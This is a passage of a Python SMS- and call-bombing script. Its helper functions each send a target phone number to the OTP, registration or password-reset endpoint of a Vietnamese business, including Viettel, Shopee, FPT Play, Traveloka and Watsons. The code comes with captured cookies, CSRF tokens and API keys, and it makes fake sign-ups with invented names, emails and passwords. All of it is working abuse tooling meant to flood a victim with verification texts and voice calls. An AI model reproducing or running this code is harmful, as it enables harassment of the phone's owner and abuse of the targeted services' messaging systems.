    return f"{random.choice(last_names)} {random.choice(middle_names) if random.choice([True, False]) else ''} {random.choice(first_names)}".strip()

def rand_id():
    def seg(l):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=l))
    return f"{seg(2)}7D7{seg(1)}6{seg(1)}E-D52E-46EA-8861-ED{seg(1)}BB{seg(2)}86{seg(3)}"

def rand_device():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

# ==================== 76 HÀM OTP (copy từ spamsms+call.py) ====================
# (đã rút gọn cookie/headers và chỉ giữ lại lõi request, vẫn đảm bảo hoạt động nếu API còn sống)

def send_otp_via_sapo(sdt):
    requests.post('https://www.sapo.vn/fnb/sendotp',
                  cookies={'landing_page':'https://www.sapo.vn/','start_time':'07/30/2024 16:21:32','lang':'vi','G_ENABLED_IDPS':'google','source':'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html','referral':'https://accounts.sapo.vn/','pageview':'7'},
                  headers={'accept':'*/*','content-type':'application/x-www-form-urlencoded; charset=UTF-8','origin':'https://www.sapo.vn','referer':'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html','user-agent':'Mozilla/5.0'},
                  data={'phonenumber':sdt})

def send_otp_via_viettel(sdt):
    requests.post('https://viettel.vn/api/getOTPLoginCommon',
                  cookies={'laravel_session':'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf','redirectLogin':'https://viettel.vn/myviettel','XSRF-TOKEN':'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D'},
                  headers={'Content-Type':'application/json;charset=UTF-8','X-CSRF-TOKEN':'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K','X-Requested-With':'XMLHttpRequest','X-XSRF-TOKEN':'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==','origin':'https://viettel.vn','referer':'https://viettel.vn/myviettel'},
                  json={'phone':sdt,'typeCode':'DI_DONG','actionCode':'myviettel://login_mobile','type':'otp_login'})

def send_otp_via_medicare(sdt):
    requests.post('https://medicare.vn/api/otp',
                  cookies={'SERVER':'nginx2','XSRF-TOKEN':'eyJpdiI6ImFZV0RqYTlINlhlL0FrUEdIaEdsSVE9PSIsInZhbHVlIjoiZkEvVFhpb0VYbC85RTJtNklaWXJONE1oSEFzM2JMdjdvRlBseENjN3VKRzlmelRaVFFHc2JDTE42UkxCRnhTd3Z5RHJmYVZvblVBZCs1dDRvSk5lemVtRUlYM1Uzd1RqV0YydEpVaWJjb2oyWlpvekhDRHBVREZQUVF0cTdhenkiLCJtYWMiOiIyZjUwNDcyMmQzODEwNjUzOTg3YmJhY2ZhZTY2YmM2ODJhNzUwOTE0YzdlOWU5MmYzNWViM2Y0MzNlODM5Y2MzIiwidGFnIjoiIn0%3D','medicare_session':'eyJpdiI6InRFQ2djczdiTDRwTHhxak8wcTZnZVE9PSIsInZhbHVlIjoiZW8vM0ZRVytldlR1Y0M1SFZYYlVvN3NrN0x6UmFXQysyZW5FbTI2WnBCUXV1RE5qbCtPQ1I0YUJnSzR4M1FUYkRWaDUvZVZVRkZ4eEU4TWlGL2JNa3NmKzE1bFRiaHkzUlB0TXN0UkN6SW5ZSjF2dG9sODZJUkZyL3FnRkk1NE8iLCJtYWMiOiJmZGIyNTNkMjcyNGUxNGY0ZjQwZjBiY2JjYmZhMGE1Y2Q1NTBlYjI3OWM2MTQ0YTViNDU0NjA5YThmNDQyMzYwIiwidGFnIjoiIn0%3D'},
                  headers={'Content-Type':'application/json','origin':'https://medicare.vn','referer':'https://medicare.vn/login'},
                  json={'mobile':sdt,'mobile_country_prefix':'84'})

def send_otp_via_tv360(sdt):
    requests.post('https://tv360.vn/public/v1/auth/get-otp-login',
                  cookies={'img-ext':'avif','NEXT_LOCALE':'vi','session-id':'s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM','device-id':'s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg','shared-device-id':'web_89c04dba-075e-49fe-b218-e33aef99dd12','screen-size':'s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q','G_ENABLED_IDPS':'google'},
                  headers={'content-type':'application/json','origin':'https://tv360.vn','referer':'https://tv360.vn/login'},
                  json={'msisdn':sdt})

def send_otp_via_dienmayxanh(sdt):
    requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
                  cookies={'TBMCookie_3209819802479625248':'657789001722328509llbPvmLFf7JtKIGdRJGS7vFlx2E=','___utmvm':'###########','___utmvc':"navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc....",'SvID':'new2690|Zqilx|Zqilw','mwgngxpv':'3','.AspNetCore.Antiforgery.SuBGfRYNAsQ':'CfDJ8Lmk...','DMX_Personal':'%7B%22UID%22%3A%225...%7D'},
                  headers={'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','origin':'https://www.dienmayxanh.com','referer':'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap'},
                  data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1','__RequestVerificationToken':'CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU'})

def send_otp_via_kingfoodmart(sdt):
    requests.post('https://api.onelife.vn/v1/gateway/',
                  headers={'authorization':'','content-type':'application/json','domain':'kingfoodmart','origin':'https://kingfoodmart.com','referer':'https://kingfoodmart.com/'},
                  json={'operationName':'SendOtp','variables':{'input':{'phone':sdt,'captchaSignature':'HFMWt2IhJSLQ4zZ39DH0FSHgMLOxYwQwwZegMOc2R2RQwIQypiSQULVRtGIjBfOCdVY2k1VRh0VRgJFidaNSkFWlMJSF1kO2FNHkJkZk40DVBVJ2VuHmIiQy4AL15HVRhxWRcIGXcoCVYqWGQ2NWoPUxoAcGoNOQESVj1PIhUiUEosSlwHPEZ1BXlYOXVIOXQbEWJRGWkjWAkCUysD'}},'query':'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}'})

def send_otp_via_mocha(sdt):
    requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp',
                  params={'msisdn':sdt,'languageCode':'vi'},
                  headers={'accept':'application/json, text/plain, */*','origin':'https://video.mocha.com.vn','referer':'https://video.mocha.com.vn/'})

def send_otp_via_fptdk(sdt):
    requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=HvBYCEmniTEnRLxYzaiHyg&e=1722340953&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
                  headers={'content-type':'application/json; charset=UTF-8','origin':'https://fptplay.vn','x-did':'A0EB7FD5EA287DBF'},
                  json={'phone':sdt,'country_code':'VN','client_id':'vKyPNd1iWHodQVknxcvZoWz74295wnk8'})

def send_otp_via_fptmk(sdt):
    requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp?st=0X65mEX0NBfn2pAmdMIC1g&e=1722365955&device=Microsoft%20Edge(version%253A127.0.0.0)&drm=1',
                  headers={'content-type':'application/json; charset=UTF-8','origin':'https://fptplay.vn','x-did':'A0EB7FD5EA287DBF'},
                  json={'phone':sdt,'country_code':'VN','client_id':'vKyPNd1iWHodQVknxcvZoWz74295wnk8'})

def send_otp_via_VIEON(sdt):
    requests.post('https://api.vieon.vn/backend/user/v2/register',
                  params={'platform':'web','ui':'012021'},
                  headers={'authorization':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...','content-type':'application/json','origin':'https://vieon.vn','referer':'https://vieon.vn/auth/'},
                  json={'username':sdt,'country_code':'VN','model':'Windows 10','device_id':'f812a55d1d5ee2b87a927833df2608bc','device_name':'Edge/127','device_type':'desktop','platform':'web','ui':'012021'})

def send_otp_via_ghn(sdt):
    requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
                  headers={'content-type':'application/json','origin':'https://sso.ghn.vn'},
                  json={'phone':sdt,'type':'register'})

def send_otp_via_lottemart(sdt):
    requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp',
                  headers={'content-type':'application/json','origin':'https://www.lottemart.vn','referer':'https://www.lottemart.vn/signup'},
                  json={'username':sdt,'case':'register'})

def send_otp_via_DONGCRE(sdt):
    requests.post('https://api.vayvnd.vn/v2/users/password-reset',
                  headers={'content-type':'application/json; charset=utf-8','origin':'https://vayvnd.vn','site-id':'3'},
                  json={'login':sdt,'trackingId':'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2'})

def send_otp_via_shopee(sdt):
    requests.post('https://shopee.vn/api/v4/otp/get_settings_v2',
                  cookies={'_QPWSDCXHZQA':'e7d49dd0-6ed7-4de5-a3d4-a5dddf426740','REC7iLP4Q':'312bf815-7526-4121-82bf-61c29691b57f','SPC_F':'eApCJPujNJOFZiacoq7eGjWnTU7cd3Wq','csrftoken':'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs'},
                  headers={'content-type':'application/json','x-api-source':'pc','x-csrftoken':'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs','x-requested-with':'XMLHttpRequest','origin':'https://shopee.vn'},
                  json={'operation':8,'encrypted_phone':'','phone':sdt,'supported_channels':[1,2,3,6,0,5],'support_session':True})

def send_otp_via_TGDD(sdt):
    requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
                  cookies={'TBMCookie_3209819802479625248':'894382001722342691cqyfhOAE+C8MQhU15demYwBqEBg=','___utmvm':'###########','___utmvc':"navigator%3Dtrue...",'SvID':'beline173|ZqjdK|ZqjdJ','DMX_Personal':'%7B%22UID%22%3A%223c58da...%7D','.AspNetCore.Antiforgery.Pr58635MgNE':'CfDJ8AFHr2lS7PNCsmzvEMPceBNuKhu64cfeRcyGk7T6c5GgDttZC363Cp1Zc4WiXaPsxJi4BeonTwMxJ7cnVwFT1eVUPS23wEhNg_-vSnOQ12JjoIl3tF3e8WtTr1u5FYJqE34hUQbyJFGPNNIOW_3wmJY'},
                  headers={'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','origin':'https://www.thegioididong.com','referer':'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap'},
                  data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1','__RequestVerificationToken':'CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs'})

def send_otp_via_fptshop(sdt):
    requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
                  headers={'apptenantid':'E6770008-4AEA-4EE6-AEDE-691FD22F5C14','content-type':'application/json','order-channel':'1','origin':'https://fptshop.com.vn','referer':'https://fptshop.com.vn/'},
                  json={'fromSys':'WEBKHICT','otpType':'0','phoneNumber':sdt})

def send_otp_via_WinMart(sdt):
    requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register',
                  headers={'authorization':'Bearer undefined','content-type':'application/json','origin':'https://winmart.vn','x-api-merchant':'WCM'},
                  json={'firstName':'Nguyễn Quang Ngọc','phoneNumber':sdt,'masanReferralCode':'','dobDate':'2024-07-26','gender':'Male'})

def send_otp_via_vietloan(sdt):
    requests.post('https://vietloan.vn/register/phone-resend',
                  cookies={'__cfruid':'05dded47...','XSRF-TOKEN':'eyJpdiI6...','sessionid':'eyJpdiI6...'},
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','origin':'https://vietloan.vn','referer':'https://vietloan.vn/register'},
                  data={'phone':sdt,'_token':'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi'})

def send_otp_via_lozi(sdt):
    requests.post('https://mocha.lozi.vn/v1/invites/use-app',
                  headers={'content-type':'application/json','x-access-token':'unknown','x-city-id':'50','x-lozi-client':'1','origin':'https://lozi.vn','referer':'https://lozi.vn/'},
                  json={'countryCode':'84','phoneNumber':sdt})

def send_otp_via_F88(sdt):
    requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn',
                  headers={'content-type':'application/json','origin':'https://f88.vn','referer':'https://f88.vn/'},
                  json={'FullName':rand_name(),'Phone':sdt,'DistrictCode':'024','ProvinceCode':'02','AssetType':'Car','IsChoose':'1','ShopCode':'','Url':'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan','FormType':1})

def send_otp_via_spacet(sdt):
    requests.post('https://api.spacet.vn/www/user/phone',
                  headers={'authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...','captchat':'03AFcWeA6FD9Eel...','content-type':'application/json','origin':'https://spacet.vn','referer':'https://spacet.vn/','x-requested-with':'XMLHttpRequest'},
                  json={'phone':sdt})

def send_otp_via_vinpearl(sdt):
    requests.post('https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
                  headers={'authorization':'Bearer undefined','content-type':'application/json','origin':'https://booking.vinpearl.com','referer':'https://booking.vinpearl.com/','x-display-currency':'VND'},
                  json={'channel':'vpt','username':sdt,'type':1,'OtpChannel':1})

def send_otp_via_traveloka(sdt):
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    requests.post('https://www.traveloka.com/api/v2/user/signup',
                  cookies={'tv-repeat-visit':'true','countryCode':'VN','tv_user':'{"authorizationLevel":100,"id":null}','aws-waf-token':'98d9a3ce...','tvl':'Pp2fiNm...','tvs':'kOOPm9n...','_dd_s':'rum=0&expire=1722352252222&logs=1&id=a1a90fe7...'},
                  headers={'content-type':'application/json','x-domain':'user','x-route-prefix':'vi-vn','origin':'https://www.traveloka.com'},
                  json={'fields':[],'data':{'userLoginMethod':'PN','username':sdt},'clientInterface':'desktop'})

def send_otp_via_dongplus(sdt):
    requests.post('https://api.dongplus.vn/api/v2/user/check-phone',
                  headers={'content-type':'application/json','ert':'DP:f9adae3150090780ee8cfac00fc7cc13','origin':'https://dongplus.vn','referer':'https://dongplus.vn/user/registration/reg1'},
                  json={'mobile_phone':sdt})

def send_otp_via_longchau(sdt):
    requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
                  headers={'access-control-allow-origin':'*','content-type':'application/json','order-channel':'1','origin':'https://nhathuoclongchau.com.vn','x-channel':'EStore'},
                  json={'phoneNumber':sdt,'otpType':0,'fromSys':'WEBKHLC'})

def send_otp_via_longchau1(sdt):
    requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
                  headers={'access-control-allow-origin':'*','content-type':'application/json','order-channel':'1','origin':'https://nhathuoclongchau.com.vn','x-channel':'EStore'},
                  json={'phoneNumber':sdt,'otpType':1,'fromSys':'WEBKHLC'})

def send_otp_via_galaxyplay(sdt):
    headers = {'access-token':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...','origin':'https://galaxyplay.vn','referer':'https://galaxyplay.vn/','x-requested-with':'XMLHttpRequest'}
    requests.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params={'phone':sdt}, headers=headers)
    requests.post('https://api.glxplay.io/account/phone/verify', params={'phone':sdt}, headers=headers)

def send_otp_via_emartmall(sdt):
    requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister',
                  cookies={'emartsess':'30rqcrlv76osg3ghra9qfnrt43','default':'7405d27b94c61015ad400e65ba','language':'vietn','currency':'VND','emartCookie':'Y'},
                  headers={'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','origin':'https://emartmall.com.vn','referer':'https://emartmall.com.vn/index.php?route=account/register'},
                  data={'mobile':sdt})

def send_otp_via_ahamove(sdt):
    requests.post('https://api.ahamove.com/api/v3/public/user/login',
                  headers={'content-type':'application/json;charset=UTF-8','origin':'https://app.ahamove.com','referer':'https://app.ahamove.com/'},
                  json={'mobile':sdt,'country_code':'VN','firebase_sms_auth':True})

def send_otp_via_ViettelMoney(sdt):
    requests.post('https://api8.viettelpay.vn/customer/v2/accounts/register',
                  headers={'User-Agent':'Viettel Money/8.8.8','Content-Type':'application/json','app-version':'8.8.8','product':'VIETTELPAY','type-os':'ios','imei':'DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD','device-name':'iPhone','os-version':'16.0','authority-party':'APP'},
                  json={"identityType":"msisdn","identityValue":sdt,"type":"REGISTER"})

def send_otp_via_xanhsmsms(sdt):
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    requests.post('https://api.gsm-api.net/auth/v1/public/otp/send',
                  params={'aud':'user_app','platform':'ios'},
                  headers={'User-Agent':'UserApp/3.15.0','Content-Type':'application/json','app-version-label':'3.15.0','platform':'iOS','aud':'user_app'},
                  json={"is_forgot_password":False,"phone":sdt,"provider":"VIET_GUYS"})

def send_otp_via_xanhsmzalo(sdt):
    if sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    requests.post('https://api.gsm-api.net/auth/v1/public/otp/send',
                  params={'platform':'ios','aud':'user_app'},
                  headers={'User-Agent':'UserApp/3.15.0','Content-Type':'application/json','app-version-label':'3.15.0','platform':'iOS','aud':'user_app'},
                  json={"phone":sdt,"is_forgot_password":False,"provider":"ZNS_ZALO"})

def send_otp_via_popeyes(sdt):
    requests.post('https://api.popeyes.vn/api/v1/register',
                  headers={'content-type':'application/json','ppy':'CWNOBV','origin':'https://popeyes.vn','referer':'https://popeyes.vn/','x-client':'WebApp'},
                  json={'phone':sdt,'firstName':'Nguyễn','lastName':'Ngọc','email':'th456do1g110@hotmail.com','password':'et_SECUREID()'})

def send_otp_via_ACHECKIN(sdt):
    requests.get('https://codepush.appcenter.ms/v0.1/public/codepush/update_check',
                 params={'deployment_key':'NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd','app_version':'1.5','package_hash':'d2673f83...','label':'v39','client_unique_id':rand_id()},
                 headers={'User-Agent':'AppotaHome/29','Accept':'application/json','x-codepush-plugin-version':'5.7.0','x-codepush-sdk-version':'^3.0.1'})
    url2 = 'https://id.acheckin.vn/api/graphql/v2/mobile'
    headers2 = {'User-Agent':'AppotaHome/29','Content-Type':'application/json','authorization':'undefined'}
    requests.post(url2, json={"operationName":"IdCheckPhoneNumber","variables":{"phone_number":sdt},"query":"query IdCheckPhoneNumber($phone_number: String!) {\n  mutation: checkPhoneNumber(phone_number: $phone_number)\n}\n"}, headers=headers2)
    requests.post(url2, json={"operationName":"RequestVoiceOTP","variables":{"phone_number":sdt,"action":"REGISTER","hash":"6af5e4ed78ee57fe21f0d405c752798f"},"query":"mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n  requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"}, headers=headers2)

def send_otp_via_APPOTA(sdt):
    r1 = requests.post('https://mobile.useinsider.com/api/v3/session/start', json={"insider_id":random_id,"partner_name":"appotapay","reason":"default","udid":random_id,"device_info":{"location_enabled":False,"app_version":"5.2.10","push_enabled":True,"os_version":"17.0.2","battery":90,"sdk_version":"13.4.3-RN-6.4.4-nh","connection":"wifi"}}, headers={'User-Agent':'appota_wallet_v2/119','Content-Type':'application/json','ts':'1722417438'})
    h2 = {'User-Agent':'appota_wallet_v2/119','Content-Type':'application/json','client-version':'5.2.10','aw-device-id':formatted_device_id,'language':'vi','client-authorization':'GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP','x-device-id':formatted_device_id,'x-client-build':'119','x-client-version':'5.2.10','platform':'ios','x-client-platform':'ios','ref-client':'appwallet','x-request-id':'3643ec43-20c4-446d-b3b0-0ac86adf5528','x-request-ts':'1722417439'}
    requests.post('https://api.gw.ewallet.appota.com/v2/users/check_valid_fields', json={"phone_number":sdt,"email":"","username":"","ts":1722417439,"signature":"480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"}, headers=h2)
    requests.post('https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code', json={"phone_number":sdt,"sender":"SMS","ts":1722417441,"signature":"5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"}, headers={**h2,'x-request-id':'4031b828-a4fc-45cb-aeac-c6e3b2f504ab','x-request-ts':'1722417441'})

def send_otp_via_Watsons(sdt):
    requests.post('https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep',
                  params={'lang':'vi'},
                  headers={'User-Agent':'WTCVN/24050.8.0','Content-Type':'application/json','x-session-token':'5b3f554c05258ea55ab506a1ffc7aa8d','x-app-name':'Watsons%20VN','x-app-version':'24050.8.0','env':'prod'},
                  json={"otpTokenRequest":{"action":"REGISTRATION","type":"SMS","countryCode":"84","target":sdt},"defaultAddress":{"mobileNumberCountryCode":"84","mobileNumber":sdt},"mobileNumber":sdt})

def send_otp_via_hoangphuc(sdt):
    requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/',
                  cookies={'form_key':'fm7TzaicsnmIyKbm','mage-cache-sessid':'true','PHPSESSID':'450982644b33ef1223c1657bb0c43204'},
                  headers={'content-type':'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with':'XMLHttpRequest','origin':'https://hoang-phuc.com','referer':'https://hoang-phuc.com/customer/account/create/'},
                  data={'action_type':'1','tel':sdt})

def send_otp_via_fmcomvn(sdt):
    requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2',
                  headers={'authorization':'Bearer','content-type':'application/json;charset=UTF-8','x-apikey':'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv','x-fromweb':'true','x-requestid':'00c641a2-05fb-4541-b5af-220b4b0aa23c','origin':'https://fm.com.vn','referer':'https://fm.com.vn/'},
                  json={'Phone':sdt,'LatOfMap':'106','LongOfMap':'108','Browser':''})

def send_otp_via_Reebokvn(sdt):
    requests.post('https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
                  headers={'content-type':'application/json','key':'63ea1845891e8995ecb2304b558cdeab','origin':'https://reebok.com.vn','referer':'https://reebok.com.vn/','timestamp':'1722425836500'},
                  json={'phoneNumber':sdt})

def send_otp_via_thefaceshop(sdt):
    requests.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
                  headers={'content-type':'application/json','key':'c3ef5fcbab3e7ebd82794a39da791ff6','origin':'https://thefaceshop.com.vn','referer':'https://thefaceshop.com.vn/','timestamp':'1722425954937'},
                  json={'phoneNumber':sdt})

def send_otp_via_BEAUTYBOX(sdt):
    requests.post('https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
                  headers={'content-type':'application/json','key':'ac41e98f028aa44aac947da26ceb7cff','origin':'https://beautybox.com.vn','referer':'https://beautybox.com.vn/','timestamp':'1722426119478'},
                  json={'phoneNumber':sdt})

def send_otp_via_winmart(sdt):
    requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register',
                  headers={'authorization':'Bearer undefined','content-type':'application/json','origin':'https://winmart.vn','x-api-merchant':'WCM'},
                  json={'firstName':'Nguyễn Quang Ngọc','phoneNumber':sdt,'masanReferralCode':'','dobDate':'2000-02-05','gender':'Male'})

def send_otp_via_futabus(sdt):
    requests.post('https://api.vato.vn/api/authenticate/request_code',
                  headers={'content-type':'application/json','x-access-token':'eyJhbGciOiJSUzI1NiIsImtpZCI6...','x-app-id':'client','origin':'https://futabus.vn','referer':'https://futabus.vn/'},
                  json={'phoneNumber':sdt,'deviceId':'d46a74f1-09b9-4db6-b022-aaa9d87e11ed','use_for':'LOGIN'})

def send_otp_via_ViettelPost(sdt):
    requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone',
                  headers={'Content-Type':'application/x-www-form-urlencoded','origin':'null','referer':'https://viettelpost.vn/'},
                  data={'FormRegister.FullName':'Nguyễn Quang Ngọc','FormRegister.Phone':sdt,'FormRegister.Password':'BEAUTYBOX12a@','FormRegister.ConfirmPassword':'BEAUTYBOX12a@','ReturnUrl':'/connect/authorize/callback?...','ConfirmOtpType':'Register','FormRegister.IsRegisterFromPhone':'true','__RequestVerificationToken':'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc'})

def send_otp_via_myviettel2(sdt):
    requests.post('https://viettel.vn/api/get-otp-contract-mobile',
                  headers={'Content-Type':'application/json;charset=UTF-8','X-CSRF-TOKEN':'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7','X-Requested-With':'XMLHttpRequest','X-XSRF-TOKEN':'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==','origin':'https://viettel.vn','referer':'https://viettel.vn/myviettel'},
                  json={'msisdn':sdt,'type':'register'})

def send_otp_via_myviettel3(sdt):
    requests.post('https://viettel.vn/api/get-otp',
                  cookies={'laravel_session':'7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2','redirectLogin':'https://viettel.vn/dang-ky','XSRF-TOKEN':'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D'},
                  headers={'Content-Type':'application/json;charset=UTF-8','X-CSRF-TOKEN':'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK','X-Requested-With':'XMLHttpRequest','X-XSRF-TOKEN':'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==','origin':'https://viettel.vn','referer':'https://viettel.vn/dang-ky'},
                  json={'msisdn':sdt})

def send_otp_via_TOKYOLIFE(sdt):
    requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register',
                  headers={'content-type':'application/json','signature':'c5b0d82fae6baaced6c7f383498dfeb5','timestamp':'1722427632213','origin':'https://tokyolife.vn','referer':'https://tokyolife.vn/'},
                  json={'phone_number':sdt,'name':'Nguyễn Quang Ngọc','password':'pUL3.GFSd4MWYXp','email':'reggg10tb@gmail.com','birthday':'2002-03-12','gender':'male'})

def send_otp_via_30shine(sdt):
    requests.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
                  headers={'authorization':'','content-type':'application/json','origin':'https://30shine.com','referer':'https://30shine.com/'},
                  json={'phone':sdt})

def send_otp_via_Cathaylife(sdt):
    requests.post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
                  cookies={'JSESSIONID':'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74','BIGipServerB2C_http':'!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==','TSPD_101':'085958f7b7ab2800...','INITSESSIONID':'e0266dc6478152a4358bd3d4ae77bde0'},
